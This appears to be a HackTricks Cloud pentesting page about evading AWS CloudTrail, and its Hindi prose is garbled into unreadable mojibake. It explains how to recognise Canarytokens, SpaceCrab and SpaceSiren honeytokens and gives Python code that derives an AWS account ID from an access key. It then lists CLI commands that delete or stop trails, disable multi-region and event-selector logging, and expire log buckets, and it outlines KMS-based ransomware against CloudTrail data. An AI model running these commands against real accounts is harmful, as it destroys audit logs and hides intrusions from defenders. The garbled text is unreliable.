рдЗрд╕ рд╡рд┐рд╢реЗрд╖ рддрдХрдиреАрдХ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/) рджреЗрдЦреЗрдВ

## **рдбрд┐рдЯреЗрдХреНрд╢рди рдХреЛ рдЫрд▓рдирд╛ рдХрд░реЗрдВ**

### HoneyTokens **рдЫрд▓рдирд╛**

Honeyokens рдХреЛ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдХреА рдирд┐рд░реНрдпрд╛рдд рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред AWS рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ, рд╡реЗ **AWS рдХреБрдВрдЬреА рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ рдореЙрдирд┐рдЯрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**, рдпрджрд┐ рдХреБрдЫ рдРрд╕рд╛ рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдЙрд╕ рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдХрд┐рд╕реА рдиреЗ рдЙрд╕ рдХреБрдВрдЬреА рдХреЛ рдЪреБрд░рд╛ рд▓рд┐рдпрд╛ рд╣реЛрдЧрд╛ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕ рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ рдХреЛ **CloudTrail** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ рдХреБрдЫ **AWS рд╕реЗрд╡рд╛рдПрдВ CloudTrail рдХреЛ рд▓реЙрдЧ рдирд╣реАрдВ рднреЗрдЬрддреА рд╣реИрдВ** (рдпрд╣рд╛рдВ [рд╕реВрдЪреА рджреЗрдЦреЗрдВ](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html))ред рдЗрдирдореЗрдВ рд╕реЗ рдХреБрдЫ рд╕реЗрд╡рд╛рдПрдВ рдПрдХ **рддреНрд░реБрдЯрд┐** рдХреЗ рд╕рд╛рде **ARN рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдВрдЧреА** рдЕрдЧрд░ рдХреЛрдИ рдЕрдирдзрд┐рдХреГрдд (рд╣рдиреАрдЯреЛрдХрди рдХреБрдВрдЬреА) рдЙрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИред

рдЗрд╕ рддрд░рд╣, рдПрдХ **рд╣рдорд▓рд╛рд╡рд░ рдмрд┐рдирд╛ рдХрд┐рд╕реА рд▓реЙрдЧ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдП рдмрд┐рдирд╛ рдХреБрдВрдЬреА рдХрд╛ ARN рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред ARN рдореЗрдВ рд╣рдорд▓рд╛рд╡рд░ AWS рдЦрд╛рддрд╛ рдЖрдИрдбреА рдФрд░ рдирд╛рдо рджреЗрдЦ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рд╣рдиреАрдЯреЛрдХрди рдХреА рдХрдВрдкрдирд┐рдпреЛрдВ рдХреЗ рдЦрд╛рддреЛрдВ рдХреА рдЖрдИрдбреА рдФрд░ рдирд╛рдо рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рдЖрд╕рд╛рди рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕ рддрд░рд╣ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдЯреЛрдХрди рдПрдХ рд╣рдиреАрдЯреЛрдХрди рд╣реИред

![](<../../../../.gitbook/assets/image (65).png>)

#### **HoneyTokens рдбрд┐рдЯреЗрдХреНрд╢рди**

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57) рдХреЛ рдпрд╣ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдПрдХ рдХреБрдВрдЬреА [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren) рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реИ:**

* рдпрджрд┐ рд░реЛрд▓ рдирд╛рдо рдпрд╛ рдЦрд╛рддрд╛ рдЖрдИрдбреА рдореЗрдВ **`canarytokens.org`** рд╢рдмреНрдж рдЖрддрд╛ рд╣реИ рдпрд╛ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдореЗрдВ **`534261010715`** рдЖрддрд╛ рд╣реИред
* рд╣рд╛рд▓ рдХреЗ рд╕рдордп рдореЗрдВ рдЙрдиреНрд╣реЗрдВ рдЯреЗрд╕реНрдЯ рдХрд░рддреЗ рд╣реБрдП, рд╡реЗ рдЦрд╛рддрд╛ **`717712589309`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдФрд░ рдЕрднреА рднреА рдирд╛рдо рдореЗрдВ **`canarytokens.com`** рд╢рдмреНрдж рд╣реИред
* рдпрджрд┐ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдореЗрдВ рд░реЛрд▓ рдирд╛рдо рдореЗрдВ **`SpaceCrab`** рд╢рдмреНрдж рдЖрддрд╛ рд╣реИ
* **SpaceSiren** рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ **uuids** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* рдпрджрд┐ **рдирд╛рдо рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рд░реВрдк рд╕реЗ рдЙрддреНрдкрдиреНрди рд▓рдЧрддрд╛ рд╣реИ**, рддреЛ рдЙрдЪреНрдЪ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдпрд╣ рдПрдХ рд╣рдиреАрдЯреЛрдХрди рд╣реИред

{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╕рднреА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ API рдХреЛ рдЬрд┐рдирдХрд╛ рдкрддрд╛ рдЪрд▓рд╛ рд╣реИ рдХрд┐ рд╡реЗ CloudTrail рд▓реЙрдЧ рдирд╣реАрдВ рдмрдирд╛ рд░рд╣реЗ рд╣реИрдВ, рдЕрдм рдареАрдХ рд╣реЛ рдЧрдП рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рд╢рд╛рдпрдж рдЖрдкрдХреЛ рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ рдвреВрдВрдврдирд╛ рдкрдбрд╝реЗрдЧрд╛...

рдпрд╛ рдЖрдк рдЕрдкрдиреА рд╣рдиреАрдЯреЛрдХрдиреНрд╕ AWS рдЦрд╛рддреЛрдВ рдХреА рд╕реВрдЪреА рдХреЗ рд╕рд╛рде рдПрдХреНрд╕реЗрд╕ рдХреБрдВрдЬреА рдореЗрдВ рд╕рдВрдХреЗрддрд┐рдд рдЕрдХрд╛рдЙрдВрдЯ рдЖрдИрдбреА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ [**рдпрд╣рд╛рдВ рд╡рд┐рд╡рд░рдг**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) рджреНрд╡рд╛рд░рд╛ рдФрд░ рдЦрд╛рддрд╛ рдЖрдИрдбреА рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print ("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
{% endhint %}

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рдореВрд▓ рдЕрдиреБрд╕рдВрдзрд╛рди**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/) рджреЗрдЦреЗрдВред

### рддреАрд╕рд░реЗ рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рддрдХ рдкрд╣реБрдВрдЪ

рдХреБрдЫ AWS рд╕реЗрд╡рд╛рдПрдВ **рдХреБрдЫ рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░** рдЬреИрд╕реЗ **рдбреЗрдЯрд╛рдмреЗрд╕** рдпрд╛ **рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝** рдХреНрд▓рд╕реНрдЯрд░ (EKS) рдХреЛ **рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВрдЧреА**ред рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдЗрди рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд╕рд╛рде рд╕реАрдзреЗ рдмрд╛рддрдЪреАрдд рдХрд░ рд░рд╣рд╛ рд╣реЛрдЧрд╛** (рдЬреИрд╕реЗ рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ API) **AWS API рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░реЗрдЧрд╛**, рдЗрд╕рд▓рд┐рдП CloudTrail рдЗрд╕ рд╕рдВрдЪрд╛рд░ рдХреЛ рджреЗрдЦрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реЛрдЧрд╛ред

рдЗрд╕рд▓рд┐рдП, EKS рддрдХ рдкрд╣реБрдВрдЪ рд╡рд╛рд▓реЗ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЬрд┐рд╕рдиреЗ EKS API рдХрд╛ URL рдЦреЛрдЬ рд▓рд┐рдпрд╛ рд╣реИ, рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдЯреЛрдХрди рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **Cloudtrail рджреНрд╡рд╛рд░рд╛ рдкрд╣рдЪрд╛рдиреЗ рдЬрд╛рдиреЗ рд╕реЗ рдмрдЪрддреЗ рд╣реБрдП рд╕реАрдзреЗ API рд╕реЗрд╡рд╛ рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### CloudTrail рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛

#### рдЯреНрд░реЗрд▓реНрд╕ рд╣рдЯрд╛рдПрдБ
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### рдЯреНрд░реЗрд▓реНрд╕ рд░реЛрдХреЗрдВ

To stop a trail, you can use the `stop-logging` command. This command will disable the logging of events for the specified trail.

```plaintext
aws cloudtrail stop-logging --name <trail_name>
```

Replace `<trail_name>` with the name of the trail you want to stop.

рдЯреНрд░реЗрд▓ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк `stop-logging` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдХрдорд╛рдВрдб рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЯреНрд░реЗрд▓ рдХреЗ рд▓рд┐рдП рдШрдЯрдирд╛рдУрдВ рдХреЗ рд▓реЙрдЧрд┐рдВрдЧ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░реЗрдЧрд╛ред

```plaintext
aws cloudtrail stop-logging --name <trail_name>
```

`<trail_name>` рдХреЛ рд░реЛрдХрдирд╛ рдЪрд╛рд╣рд┐рдП рдЯреНрд░реЗрд▓ рдХреЗ рдирд╛рдо рд╕реЗ рдмрджрд▓реЗрдВред
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### рдорд▓реНрдЯреА-рд░реАрдЬрди рд▓реЙрдЧрд┐рдВрдЧ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░реЗрдВ

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
#### рдИрд╡реЗрдВрдЯ рд╕реЗрд▓реЗрдХреНрдЯрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рд▓реЙрдЧрд┐рдВрдЧ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░реЗрдВ

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

рдкрд╣рд▓реЗ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рдПрдХ рдПрдХрд▓ рдШрдЯрдирд╛ рдЪрдпрдирдХрд░реНрддрд╛ рдПрдХрд▓ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рд╕рд╛рде рдПрдХ JSON рдПрд░реЗ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред `"ReadWriteType": "ReadOnly"` рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ **рдЗрд╡реЗрдВрдЯ рд╕реЗрд▓реЗрдХреНрдЯрд░ рдХреЗрд╡рд▓ рдХреЗрд╡рд▓ рдкрдардиреАрдп рдШрдЯрдирд╛рдУрдВ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░реЗрдЧрд╛** (рдЗрд╕рд▓рд┐рдП CloudTrail рдЗрдВрд╕рд╛рдЗрдЯреНрд╕ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рд▓реЗрдЦрдиреАрдп рдШрдЯрдирд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХрд░реЗрдЧрд╛)ред

рдЖрдк рдЕрдкрдиреА рд╡рд┐рд╢реЗрд╖ рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЗрд╡реЗрдВрдЯ рд╕реЗрд▓реЗрдХреНрдЯрд░ рдХреЛ рдЕрдиреБрдХреВрд▓рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

#### S3 рдЬреАрд╡рдирдЪрдХреНрд░ рдиреАрддрд┐ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд▓реЙрдЧ рд╣рдЯрд╛рдирд╛

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### рдмрдХреЗрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрди

* S3 рдмрдХреЗрдЯ рдХреЛ рд╣рдЯрд╛рдПрдВ
* рдмрдХреЗрдЯ рдиреАрддрд┐ рдХреЛ рдмрджрд▓реЗрдВ рддрд╛рдХрд┐ рдХреНрд▓рд╛рдЙрдбрдЯреНрд░реЗрд▓ рд╕реЗрд╡рд╛ рд╕реЗ рдХреЛрдИ рд▓реЗрдЦрди рди рдХрд░ рд╕рдХреЗ
* S3 рдмрдХреЗрдЯ рдореЗрдВ рдЬреАрд╡рдирдХрд╛рд▓ рдиреАрддрд┐ рдЬреЛрдбрд╝реЗрдВ рддрд╛рдХрд┐ рдСрдмреНрдЬреЗрдХреНрдЯ рд╣рдЯрд╛ рджрд┐рдП рдЬрд╛ рд╕рдХреЗрдВ
* рдХреНрд▓рд╛рдЙрдбрдЯреНрд░реЗрд▓ рд▓реЙрдЧреНрд╕ рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП kms рдХреБрдВрдЬреА рдХреЛ рдЕрдХреНрд╖рдо рдХрд░реЗрдВ

### рдХреНрд▓рд╛рдЙрдбрдЯреНрд░реЗрд▓ рд░реИрдВрд╕рдорд╡реЗрдпрд░

#### S3 рд░реИрдВрд╕рдорд╡реЗрдпрд░

рдЖрдк **рдПрдХ рдЕрд╕рдордорд┐рдд рдХреБрдВрдЬреА рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ **рдХреНрд▓рд╛рдЙрдбрдЯреНрд░реЗрд▓ рдбреЗрдЯрд╛ рдХреЛ рдЙрд╕ рдХреБрдВрдЬреА рд╕реЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ **рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЛ рд╣рдЯрд╛ рджреЗрдВ** рддрд╛рдХрд┐ рдХреНрд▓рд╛рдЙрдбрдЯреНрд░реЗрд▓ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред\
рдпрд╣ рдореВрд▓ рд░реВрдк рд╕реЗ рдПрдХ **S3-KMS рд░реИрдВрд╕рдорд╡реЗрдпрд░** рд╣реИ рдЬрд┐рд╕рдХреА рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХреА рдЧрдИ рд╣реИ:

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**KMS рд░реИрдВрд╕рдорд╡реЗрдпрд░**

рдпрд╣ рдкрд┐рдЫрд▓реЗ рд╣рдорд▓реЗ рдХреЛ рдЕрд▓рдЧ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рд╣реИ:

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **рд╕рдВрджрд░реНрдн**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

<details>

<summary><strong>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХрд╛ рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ,** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗред

</details>
